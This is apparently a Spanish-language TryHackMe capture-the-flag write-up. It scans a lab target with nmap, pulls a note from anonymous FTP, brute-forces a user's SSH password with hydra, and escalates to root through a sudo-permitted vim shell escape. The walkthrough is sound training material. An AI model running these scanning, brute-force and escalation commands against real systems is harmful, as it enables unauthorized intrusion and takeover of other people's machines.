Bienvenidos a otra sala de tryhackme. Realizamos nuestro escaneo con la herramienta bien conocida para descubrir puertos abiertos. Secuestramos una nota dejada a un usuario con debilidad de password y utilizaremos hydra para descubrirla y establecer una conexion en shh, para luego escalar privilegios en el sistema abusando vim.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-03 07:28:54 EDT for 35s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 3 puertos abiertos. Podemos ingresar al servicio ftp con usuario Anonymous para ver si podemos secuestrar alguna nota o algo que nos interese.

```bash
ftp IPTARGET
User:Anonymous
```

Descubrimos una nota para mitch, que se trata de su seguridad utilizando la misma password.
Podemos descubrir directorios ocultos en gobuster y descubrir el CMS con su version. Luego buscar el exploit por internet y crackear la password de mitch.
O bien, en  mi caso, usare hydra para descubrir sus credenciales ssh porque no posee mucha seguridad en su password.

# Intrusion

Ejecutamos hydra para descubrir  las credenciales de mitch y asi establecer una conexion ssh en nuestro sistema. Tenemos que indicarle el puerto, ya que si lo lanzamos sin indicarselo, hydra tomara el puerto por defecto 22.

```bash
hydra -l mitch -P /Path/Wordlist ssh://IPTARGET -s 2222 -vV
```

Descubrimos su password y lo siguiente es establecer la conexion ssh

```bash
ssh mitch@IPTARGET -p 2222
```

# Priv.Escalation

Listamos permisos sudo `sudo -l` y mitch tiene permisos root alojados en /usr/bin/vim.
Para escalar privilegios con vim, ejecutamos lo siguiente:

```bash
sudo vim -c ':!/bin/sh'
```

La informacion esta en https://gtfobins.github.io/gtfobins/vim/